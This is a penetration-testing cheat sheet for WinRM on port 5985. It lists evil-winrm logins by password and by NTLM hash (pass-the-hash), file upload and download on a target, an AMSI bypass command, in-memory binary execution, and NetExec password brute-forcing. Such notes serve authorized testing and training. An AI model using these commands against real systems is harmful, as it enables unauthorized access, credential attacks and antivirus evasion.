# Port 5985 - WINRM

## Table of Contents
- [Enumeration](#enumeration)
    - [Evil-winrm](#evil-winrm)
    - [Command](#command)
    - [BruteForce](#bruteforce)

| Name | Link |
| :--- | :--- |
| Hackviser| https://hackviser.com/tactics/pentesting/services/winrm |

### Enumeration

#### Check Connect

##### Evil-winrm

```shell
evil-winrm -i $rhost -u 'administrator' -p 'P@ssw0rd'
```

```shell
evil-winrm -i $rhost -u 'administrator' -H 'ntlm_hash'
```

#### Command

Common evil-winrm Commands


- Upload

    ```shell
    upload /local/file.exe C:\Windows\Temp\file.exe
    ```

- Download

    ```shell
    download C:\file.txt /tmp/file.txt
    ```

- Services

    ```shell
    services
    ```

- Show available commands menu

    ```shell
    menu
    ```

- Bypass AMSI

    ```shell
    Bypass-4MSI
    ```

- Invoke-Binary

    ```shell
    Invoke-Binary /path/to/binary.exe
    ```

#### BruteForce

##### NetExec

```shell
nxc winrm $rhost -u users.txt -p passwords.txt
```